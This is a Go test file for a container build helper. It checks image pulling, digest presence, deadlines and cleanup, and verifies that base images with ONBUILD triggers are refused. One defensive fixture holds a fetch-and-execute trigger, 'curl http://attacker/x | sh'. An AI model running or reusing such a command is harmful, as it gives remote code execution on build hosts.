// Copyright 2025 The Wardyn Authors
// SPDX-License-Identifier: Apache-2.0

//go:build docker

package envbuild

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// toolsDirWithRequired creates a temp dir containing every required runner tool
// as an executable stub, so validateToolsDir passes.
func toolsDirWithRequired(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for _, name := range requiredTools {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("#!/bin/sh\n"), 0o755); err != nil {
			t.Fatalf("write tool %q: %v", name, err)
		}
	}
	return dir
}

func TestFinalizeBase_WrapsPresentBase(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	f.imagesPresent["ubuntu:24.04"] = true // pre-pulled base
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	tag, err := b.FinalizeBase(context.Background(), "ubuntu:24.04", "wardyn-byoi/run-1:latest", nil)
	if err != nil {
		t.Fatalf("FinalizeBase: %v", err)
	}
	if tag != "wardyn-byoi/run-1:latest" {
		t.Fatalf("wrong output tag: %q", tag)
	}
	if !f.imageBuildCalled {
		t.Fatal("finalize did not run the wrap ImageBuild")
	}
	if len(f.lastBuildTags) != 1 || f.lastBuildTags[0] != "wardyn-byoi/run-1:latest" {
		t.Fatalf("wrap tagged %v, want [wardyn-byoi/run-1:latest]", f.lastBuildTags)
	}
	// A present base must NOT trigger a pull (private/local images work).
	if f.pullCalled {
		t.Fatal("FinalizeBase pulled a base that was already present")
	}
}

func TestFinalizeBase_PullsAbsentBase(t *testing.T) {
	f := newFakeEnvbuilderDocker() // only envbuilder:test present
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	if _, err := b.FinalizeBase(context.Background(), "myco/dev:latest", "wardyn-byoi/run-2:latest", nil); err != nil {
		t.Fatalf("FinalizeBase: %v", err)
	}
	if !f.pullCalled {
		t.Fatal("FinalizeBase did not pull an absent base")
	}
}

func TestFinalizeBase_PrePulledDigestBaseIsNotRePulled(t *testing.T) {
	// A digest-pinned base pre-pulled on the host (present via RepoDigests) must
	// NOT trigger a pull — that's the "immutable, no registry-auth" workflow.
	ref := "myco/dev@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	f := newFakeEnvbuilderDocker()
	f.imagesPresent[ref] = true
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	if _, err := b.FinalizeBase(context.Background(), ref, "wardyn-byoi/run-d:latest", nil); err != nil {
		t.Fatalf("FinalizeBase on a pre-pulled digest base: %v", err)
	}
	if f.pullCalled {
		t.Fatal("FinalizeBase re-pulled a pre-pulled digest-pinned base (RepoDigests not matched)")
	}
}

func TestFinalizeBase_FailsClosedOnBuildError(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	f.imagesPresent["distroless/static"] = true
	f.buildErr = "COPY failed: no shell in base"
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	_, err := b.FinalizeBase(context.Background(), "distroless/static", "wardyn-byoi/run-3:latest", nil)
	if err == nil {
		t.Fatal("expected FinalizeBase to fail closed on a wrap-build error")
	}
	if !strings.Contains(err.Error(), "COPY failed") {
		t.Fatalf("error should carry the build failure, got: %v", err)
	}
}

// A hostile BYOI base carrying ONBUILD triggers must be REFUSED, not wrapped:
// the wrap build runs on the host daemon outside every confinement tier, so its
// FROM would fire the triggers as host-side build-time RCE. This is the
// wrap-only guarantee.
func TestFinalizeBase_RefusesBaseWithOnBuildTriggers(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	f.imagesPresent["evil/base:latest"] = true
	f.onBuild = map[string][]string{
		"evil/base:latest": {"RUN curl http://attacker/x | sh", "COPY . /"},
	}
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	_, err := b.FinalizeBase(context.Background(), "evil/base:latest", "wardyn-byoi/run-5:latest", nil)
	if err == nil {
		t.Fatal("expected FinalizeBase to refuse a base carrying ONBUILD triggers")
	}
	if !strings.Contains(err.Error(), "ONBUILD") {
		t.Fatalf("error should name ONBUILD, got: %v", err)
	}
	// Fail CLOSED: the wrap build must never start, or the triggers already ran.
	if f.imageBuildCalled {
		t.Fatal("wrap ImageBuild ran despite ONBUILD triggers — the triggers would have executed on the host")
	}
}

// The devcontainer path wraps an envbuilder-pushed base built from an untrusted
// repo, so it must get the same ONBUILD refusal as BYOI.
func TestBuild_RefusesPushedBaseWithOnBuildTriggers(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	f.onBuild = map[string][]string{"reg.example.com/cache": {"RUN /bin/evil"}}
	b := newWithClient(f, "envbuilder:test", "reg.example.com/cache")
	b.ToolsDir = toolsDirWithRequired(t)

	_, err := b.Build(context.Background(), BuildSpec{
		RepoURL:        "https://example.com/repo.git",
		OutputImageTag: "wardyn-env/run-6:latest",
	})
	if err == nil {
		t.Fatal("expected Build to refuse a pushed base carrying ONBUILD triggers")
	}
	if !strings.Contains(err.Error(), "ONBUILD") {
		t.Fatalf("error should name ONBUILD, got: %v", err)
	}
	if f.imageBuildCalled {
		t.Fatal("finalize ImageBuild ran despite ONBUILD triggers on the pushed base")
	}
}

// The devcontainer path must still pull the freshly pushed base, but it has to
// do so BEFORE the ONBUILD preflight and then build from that exact local image.
// Leaving the pull to the daemon (PullParent) would re-resolve the FROM after
// the check, so a mutable cache-repo tag could swap underneath it (TOCTOU).
func TestBuild_PullsBaseItselfSoTheDaemonCannotRePullPastThePreflight(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	b := newWithClient(f, "envbuilder:test", "reg.example.com/cache")
	b.ToolsDir = toolsDirWithRequired(t)

	if _, err := b.Build(context.Background(), BuildSpec{
		RepoURL:        "https://example.com/repo.git",
		OutputImageTag: "wardyn-env/run-7:latest",
	}); err != nil {
		t.Fatalf("Build: %v", err)
	}
	// The pushed base is still fetched fresh, from THIS build's own per-build
	// push ref (: a bare/shared ref would let a concurrent
	// build's push resolve here instead — see TestBuild_ConcurrentBuildsUsePerBuildPushRef).
	if len(f.pulledRefs) == 0 {
		t.Fatal("finalize did not pull the freshly pushed base")
	}
	pulledRef := f.pulledRefs[len(f.pulledRefs)-1]
	if !strings.HasPrefix(pulledRef, "reg.example.com/cache:") {
		t.Fatalf("pulled ref = %q, want it under the reg.example.com/cache repo with a per-build tag", pulledRef)
	}
	if f.lastBuildPullParent {
		t.Fatal("wrap build set PullParent: the daemon could resolve a base the ONBUILD preflight never saw")
	}
	// The preflight must inspect the EXACT ref that was just pulled — a
	// mismatch would reopen the TOCTOU this test's name calls out.
	if len(f.inspected) == 0 || f.inspected[0] != pulledRef {
		t.Fatalf("wrap inspected %v, want the SAME ref it just pulled (%q)", f.inspected, pulledRef)
	}
}

func TestFinalizeBase_FailsWhenToolsDirMissing(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	b := newWithClient(f, "envbuilder:test", "")
	// No ToolsDir configured (and no env var in this test).
	t.Setenv(envToolsDir, "")
	if _, err := b.FinalizeBase(context.Background(), "ubuntu:24.04", "wardyn-byoi/run-4:latest", nil); err == nil {
		t.Fatal("expected FinalizeBase to fail closed with no tools dir")
	}
}

// TestFinalizeBase_AppliesOwnDeadline is:
// runBuildAndFinalize (the devcontainer-build path) always bounds its work
// with BuildTimeout/defaultBuildTimeout; FinalizeBase (the BYOI-wrap path)
// used to run under whatever the caller's ctx carried — nothing at all for a
// caller that detaches from request cancellation (context.WithoutCancel,
// e.g. launchRecordRun). Called with context.Background() (no deadline) and
// a small BuildTimeout, FinalizeBase must still apply ITS OWN bound: the
// underlying docker call must observe a ctx with a deadline.
func TestFinalizeBase_AppliesOwnDeadline(t *testing.T) {
	f := newFakeEnvbuilderDocker()
	f.imagesPresent["ubuntu:24.04"] = true
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)
	b.BuildTimeout = time.Hour // any positive value; the assertion is presence, not the exact deadline

	if _, err := b.FinalizeBase(context.Background(), "ubuntu:24.04", "wardyn-byoi/run-6:latest", nil); err != nil {
		t.Fatalf("FinalizeBase: %v", err)
	}
	if !f.lastImageListHadDeadline {
		t.Fatal("FinalizeBase called the docker client with an undeadlined ctx — " +
			"it must apply BuildTimeout/defaultBuildTimeout itself, not rely on the caller to wrap it")
	}
}

// TestFinalizeBase_PrePulledTagAndDigestBaseIsNotRePulled is B9-F2: the
// fully-qualified `repo:tag@sha256:...` form — what a resolved BYOI base
// actually carries once an operator pins it — is present locally under NEITHER
// list verbatim. A real daemon splits it: `myco/dev:1.2` under RepoTags,
// `myco/dev@sha256:...` under RepoDigests, the tag stripped. ensureImage's
// exact-string scan over both lists therefore matched nothing and fell through
// to a pull — for a private or local-only image with no registry auth, that
// pull FAILS and the wrap never happens, which is precisely the workflow the
// digest form exists to serve.
//
// Its sibling TestFinalizeBase_PrePulledDigestBaseIsNotRePulled covers the
// tag-less form, which the scan did match; this one is the form it could not.
func TestFinalizeBase_PrePulledTagAndDigestBaseIsNotRePulled(t *testing.T) {
	const ref = "myco/dev:1.2@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
	f := newFakeEnvbuilderDocker()
	f.imagesPresent[ref] = true
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	if _, err := b.FinalizeBase(context.Background(), ref, "wardyn-byoi/run-t:latest", nil); err != nil {
		t.Fatalf("FinalizeBase on a pre-pulled repo:tag@sha256 base: %v", err)
	}
	if f.pullCalled {
		t.Fatalf("FinalizeBase re-pulled a pre-pulled repo:tag@sha256 base (pulled %v) — "+
			"the daemon reports its tag and its digest in two different lists, so neither "+
			"entry ever equals the ref; presence must be read by inspect", f.pulledRefs)
	}
}

// TestFinalizeBase_AbsentDigestBasePullsExactlyOnce is the negative control for
// the inspect-first presence check: reading presence through ImageInspect must
// not make every digest-pinned ref look present. An ABSENT one still pulls, and
// pulls exactly once.
func TestFinalizeBase_AbsentDigestBasePullsExactlyOnce(t *testing.T) {
	const ref = "myco/dev:9.9@sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
	f := newFakeEnvbuilderDocker() // only envbuilder:test present
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	if _, err := b.FinalizeBase(context.Background(), ref, "wardyn-byoi/run-a:latest", nil); err != nil {
		t.Fatalf("FinalizeBase on an absent digest base: %v", err)
	}
	pulls := 0
	for _, r := range f.pulledRefs {
		if r == ref {
			pulls++
		}
	}
	if pulls != 1 {
		t.Fatalf("pulled %q %d times (all pulls: %v), want exactly 1", ref, pulls, f.pulledRefs)
	}
}

// TestBuild_UntagsThePerBuildBaseAfterFinalize is B9-F3: every devcontainer
// build pulls its own per-build base (newPushRef gives each one a fresh uuid
// tag) and then wraps it into the output image. The base's layers are shared
// with that output, so what is left behind is a TAG — one per build, forever,
// each holding a full base image's worth of layers pinned against any prune. On
// a busy builder that is the disk.
//
// `docker rmi <tag>` untags; it deletes nothing an output image still
// references. Both arms assert that directly: the output tag still resolves
// after the base is dropped. The reclaim also has to run on the FAILED finalize
// path — a build that fails after the pull leaves exactly the same tag.
func TestBuild_UntagsThePerBuildBaseAfterFinalize(t *testing.T) {
	for _, tc := range []struct {
		name     string
		buildErr string
	}{
		{name: "finalize succeeds"},
		{name: "finalize fails", buildErr: "COPY failed: no such file"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFakeEnvbuilderDocker()
			f.buildErr = tc.buildErr
			b := newWithClient(f, "envbuilder:test", "reg.example.com/cache")
			b.ToolsDir = toolsDirWithRequired(t)

			const outputTag = "wardyn-env/run-rm:latest"
			_, err := b.Build(context.Background(), BuildSpec{
				RepoURL:        "https://example.com/repo.git",
				OutputImageTag: outputTag,
			})
			if (err != nil) != (tc.buildErr != "") {
				t.Fatalf("Build error = %v, want error: %v", err, tc.buildErr != "")
			}

			if len(f.pulledRefs) == 0 {
				t.Fatal("finalize never pulled the per-build base — nothing to reclaim")
			}
			baseRef := f.pulledRefs[len(f.pulledRefs)-1]
			if !strings.HasPrefix(baseRef, "reg.example.com/cache:") {
				t.Fatalf("pulled ref = %q, want this build's own per-build push ref", baseRef)
			}
			if !f.removedImage(baseRef) {
				t.Errorf("the per-build base %q was left tagged after finalize (removed: %v)", baseRef, f.removedImages)
			}
			if tc.buildErr == "" && !f.imagesPresent[outputTag] {
				t.Errorf("reclaiming the base untagged the image it was wrapped into — %q no longer resolves", outputTag)
			}
		})
	}
}

// TestFinalizeBase_DigestInspectDaemonErrorIsNotAPull is R-04: reading presence
// through ImageInspect has to make the distinction the docker driver's
// imagePresent makes — "the daemon says it does not have this" is absence, and
// anything else is the daemon failing to answer. Treating the two the same still
// fails closed (the pull errors too), but it reports a registry refusal for what
// was a broken socket, on the private pre-pulled base where that message is
// least true. Which is the exact confusion B9-F8 was raised to remove.
func TestFinalizeBase_DigestInspectDaemonErrorIsNotAPull(t *testing.T) {
	const ref = "myco/dev:3.0@sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
	f := newFakeEnvbuilderDocker()
	f.imagesPresent[ref] = true
	f.inspectErrs = map[string]error{ref: errors.New("Cannot connect to the Docker daemon at unix:///var/run/docker.sock")}
	b := newWithClient(f, "envbuilder:test", "")
	b.ToolsDir = toolsDirWithRequired(t)

	_, err := b.FinalizeBase(context.Background(), ref, "wardyn-byoi/run-e:latest", nil)
	if err == nil {
		t.Fatal("FinalizeBase with an unanswerable daemon: got nil error")
	}
	if !strings.Contains(err.Error(), "Cannot connect to the Docker daemon") {
		t.Errorf("the daemon's own answer was replaced instead of surfaced: %v", err)
	}
	if f.pullCalled {
		t.Errorf("a daemon that could not answer is not an absent image — it must not trigger a pull (pulled %v)", f.pulledRefs)
	}
}
